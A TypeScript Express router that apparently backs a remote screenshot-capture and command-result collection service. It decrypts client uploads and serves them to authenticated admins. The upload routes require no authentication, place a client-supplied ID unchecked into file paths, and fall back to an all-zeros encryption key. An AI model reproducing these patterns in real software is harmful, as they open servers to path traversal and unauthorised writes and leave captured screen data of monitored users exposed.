import { Router } from "express";
import multer from "multer";
import path from "path";
import fs from "fs";
import { decryptAes256CbcPrefixedIv, decryptFileStream } from "../encryption";
import { requireAuth } from "../middleware/auth";
import { getClient, getFavorites, setFavorite } from "../store";

const router = Router();
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const tempDir = path.join(process.cwd(), "temp_uploads");
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
    cb(null, tempDir);
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}_${Math.random().toString(36).slice(2)}`);
  },
});
const upload = multer({
  storage,
  limits: { fileSize: 10 * 1024 * 1024 * 1024 },
});

const UPLOAD_DIR =
  process.env.UPLOAD_DIR || path.join(process.cwd(), "storage");

router.post("/screenshots", upload.single("screenshot"), async (req, res) => {
  const tempPath = req.file?.path;
  try {
    const clientId =
      (req.body.clientId as string) ||
      (req.headers["x-client-id"] as string) ||
      "";
    const timestampStr =
      (req.body.timestamp as string) || new Date().toISOString();
    if (!clientId || !req.file || !tempPath)
      return res
        .status(400)
        .json({ message: "clientId and screenshot required" });

    let client: any = await getClient(clientId);
    if (!client) {
      // Fallback for new clients in file mode
      client = {
        id: clientId,
        encryptionKey:
          process.env.ENCRYPTION_KEY ||
          "0000000000000000000000000000000000000000000000000000000000000000",
      };
    }

    let keysToTry: string[] = [];
    if (client && client.encryptionKey) {
      keysToTry.push(client.encryptionKey);
    }
    const globalKey =
      process.env.ENCRYPTION_KEY ||
      "0000000000000000000000000000000000000000000000000000000000000000";
    if (!keysToTry.includes(globalKey)) {
      keysToTry.push(globalKey);
    }

    const clientDir = path.join(UPLOAD_DIR, "screenshots", clientId);
    fs.mkdirSync(clientDir, { recursive: true });

    // Treat the incoming timestamp as absolute truth (Client's Local Time)
    // If it's "2025-12-19T23:15:00.000" (no Z), new Date() might treat as Local or UTC depending on server env.
    // To ensure consistency, we force it to be treated as UTC so the numbers are preserved in DB.
    // DB stores UTC. Frontend sees UTC. "1 Time for Everything".
    let tsToParse = timestampStr;
    if (
      !tsToParse.endsWith("Z") &&
      !tsToParse.includes("+") &&
      !tsToParse.includes("-")
    ) {
      tsToParse += "Z";
    }
    const tsParsed = new Date(tsToParse);
    const sendTs = isNaN(tsParsed.getTime()) ? new Date() : tsParsed;

    const adjTs = sendTs;
    const iso = adjTs.toISOString().replace(/[:]/g, "-");
    const filename = `${clientId}_${iso}.jpg`;
    const filepath = path.join(clientDir, filename);

    let usedKey = "";
    for (const key of keysToTry) {
      try {
        await decryptFileStream(tempPath, filepath, key);
        usedKey = key;
        break;
      } catch (e) {
        // If failed, delete partial file
        if (fs.existsSync(filepath)) fs.unlinkSync(filepath);
        continue;
      }
    }

    if (!usedKey) {
      console.error(
        `[Screenshots] Failed to decrypt for client ${clientId}. Tried ${keysToTry.length} keys.`,
      );
      return res.status(400).json({ message: "Decryption failed" });
    }

    const rec = {
      id: `${clientId}_${Date.now()}`,
      filename,
      path: filepath,
      timestamp: adjTs,
    };
    // No prisma.screenshot.create call here as we are file-based

    res.json({
      ok: true,
      id: rec.id,
      filename,
      path: filepath,
      timestamp: adjTs.toISOString(),
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to ingest screenshot" });
  } finally {
    if (tempPath && fs.existsSync(tempPath)) {
      try {
        fs.unlinkSync(tempPath);
      } catch {}
    }
  }
});

router.post("/reports", upload.single("report"), async (req, res) => {
  const tempPath = req.file?.path;
  try {
    const clientId =
      (req.body.clientId as string) ||
      (req.headers["x-client-id"] as string) ||
      "";
    const timestampStr = new Date().toISOString();
    if (!clientId || !req.file || !tempPath)
      return res.status(400).json({ message: "clientId and report required" });

    let client: any = await getClient(clientId);
    if (!client) {
      client = {
        id: clientId,
        encryptionKey:
          process.env.ENCRYPTION_KEY ||
          "0000000000000000000000000000000000000000000000000000000000000000",
      };
    }

    if (!client || !client.encryptionKey) {
      return res
        .status(400)
        .json({ message: "Client not registered or missing key" });
    }

    const clientDir = path.join(UPLOAD_DIR, "reports", clientId);
    fs.mkdirSync(clientDir, { recursive: true });
    const now2 = new Date();
    const filename = `${now2.toISOString().replace(/[:]/g, "-")}_${Date.now()}`;
    const filepath = path.join(clientDir, filename);

    await decryptFileStream(tempPath, filepath, client.encryptionKey);

    const rec = {
      id: `${clientId}_${Date.now()}`,
      filename,
      path: filepath,
      timestamp: new Date(timestampStr),
    };
    // No prisma.report.create call here as we are file-based

    res.json({ id: rec.id });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to ingest report" });
  } finally {
    if (tempPath && fs.existsSync(tempPath)) {
      try {
        fs.unlinkSync(tempPath);
      } catch {}
    }
  }
});

// Toggle favorite
router.put("/screenshots/:id/favorite", requireAuth, async (req, res) => {
  try {
    const id = req.params.id;
    const { isFavorite } = req.body;
    await setFavorite(id, isFavorite);
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to update favorite" });
  }
});

// Listings for admin
router.get("/screenshots", requireAuth, async (req, res) => {
  try {
    const screenshotsDir = path.join(UPLOAD_DIR, "screenshots");
    if (!fs.existsSync(screenshotsDir)) {
      return res.json({ data: [], total: 0 });
    }

    const favorites = new Set(await getFavorites());
    let allFiles: any[] = [];
    const clientDirs = fs.readdirSync(screenshotsDir);

    const maxPerClient = 10; // Low memory: ~20 clients * 10 = 200 entries max
    for (const clientId of clientDirs) {
      const clientDir = path.join(screenshotsDir, clientId);
      if (!fs.statSync(clientDir).isDirectory()) continue;

      const files = fs.readdirSync(clientDir);
      const sorted = files
        .filter((f) => f.endsWith(".jpg") || f.endsWith(".png"))
        .map((f) => ({
          f,
          mtime: fs.statSync(path.join(clientDir, f)).mtime.getTime(),
        }))
        .sort((a, b) => b.mtime - a.mtime)
        .slice(0, maxPerClient);
      for (const { f, mtime } of sorted) {
        let timestamp: Date;
        const match = f.match(/_(\d{4}-\d{2}-\d{2}T[\d-]+\.\d+Z)/);
        if (match) {
          const datePart = match[1].substring(0, 10);
          const timePart = match[1].substring(11).replace(/-/g, ":");
          const d = new Date(`${datePart}T${timePart}`);
          timestamp = !isNaN(d.getTime()) ? d : new Date(mtime);
        } else {
          timestamp = new Date(mtime);
        }
        allFiles.push({
          id: f,
          clientId,
          filename: f,
          path: path.join(clientDir, f),
          timestamp,
          createdAt: timestamp,
          isFavorite: favorites.has(f),
        });
      }
    }

    // Sort desc
    allFiles.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());

    // Pagination
    const page = parseInt(req.query.page as string) || 1;
    const pageSize = parseInt(req.query.pageSize as string) || 20;

    // Filter by clientId if needed
    const filterClient = req.query.clientId as string;
    if (filterClient) {
      allFiles = allFiles.filter((f) => f.clientId === filterClient);
    }

    // Filter by isFavorite
    if (req.query.isFavorite === "true") {
      allFiles = allFiles.filter((f) => f.isFavorite);
    }

    const total = allFiles.length;
    const start = (page - 1) * pageSize;
    const slice = allFiles.slice(start, start + pageSize);

    return res.json({ data: slice, total });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ message: "Failed to list screenshots" });
  }
});

router.get("/reports", requireAuth, async (req, res) => {
  return res.json({ data: [], total: 0 });
});

// Secure file serving
router.get("/screenshots/:filename/file", requireAuth, async (req, res) => {
  try {
    const filename = req.params.filename;
    // filename format: CLIENT02_...jpg
    // We need to find which client dir it is in.
    const clientIdMatch = filename.match(/^([^_]+)_/);
    if (!clientIdMatch)
      return res.status(404).json({ message: "Invalid filename format" });

    const clientId = clientIdMatch[1];
    const filePath = path.join(UPLOAD_DIR, "screenshots", clientId, filename);

    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ message: "File not found" });
    }

    res.sendFile(filePath);
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to serve file" });
  }
});

router.get("/reports/:id/file", requireAuth, async (req, res) => {
  return res.status(404).json({ message: "Not found" });
});

// Reports CSV export
router.get("/reports/:id/csv", requireAuth, async (req, res) => {
  return res.status(404).json({ message: "Not found" });
});

// Command result file upload (encrypted)
router.post("/commands/:id/result", upload.single("file"), async (req, res) => {
  const tempPath = req.file?.path;
  try {
    const id = req.params.id;
    const clientId =
      (req.body.clientId as string) ||
      (req.headers["x-client-id"] as string) ||
      "";
    const timestampStr =
      (req.body.timestamp as string) || new Date().toISOString();
    if (!clientId || !req.file || !tempPath)
      return res.status(400).json({ message: "clientId and file required" });

    let client: any = await getClient(clientId);
    if (!client) {
      client = {
        id: clientId,
        encryptionKey:
          process.env.ENCRYPTION_KEY ||
          "0000000000000000000000000000000000000000000000000000000000000000",
      };
    }

    if (!client || !client.encryptionKey) {
      return res
        .status(400)
        .json({ message: "Client not registered or missing key" });
    }

    const clientDir = path.join(UPLOAD_DIR, "commands", clientId);
    fs.mkdirSync(clientDir, { recursive: true });
    const filename = `${id}_${timestampStr.replace(/[:]/g, "-")}_${Date.now()}`;
    const filepath = path.join(clientDir, filename);

    await decryptFileStream(tempPath, filepath, client.encryptionKey);

    res.json({ ok: true, path: filepath });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to ingest command file result" });
  } finally {
    if (tempPath && fs.existsSync(tempPath)) {
      try {
        fs.unlinkSync(tempPath);
      } catch {}
    }
  }
});

// Admin: download latest file result for a command id
router.get("/commands/:id/file/latest", requireAuth, async (req, res) => {
  try {
    const id = req.params.id;
    const baseDir = path.join(UPLOAD_DIR, "commands");
    const clientDirs = fs.existsSync(baseDir) ? fs.readdirSync(baseDir) : [];
    let latestPath = "";
    let latestMtime = 0;
    for (const c of clientDirs) {
      const dir = path.join(baseDir, c);
      const files = fs.readdirSync(dir).filter((f) => f.startsWith(`${id}_`));
      for (const f of files) {
        const fp = path.join(dir, f);
        const stat = fs.statSync(fp);
        if (stat.mtimeMs > latestMtime) {
          latestMtime = stat.mtimeMs;
          latestPath = fp;
        }
      }
    }
    if (!latestPath) return res.status(202).json({ message: "Pending" });
    res.sendFile(latestPath);
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to fetch command file" });
  }
});

export default router;
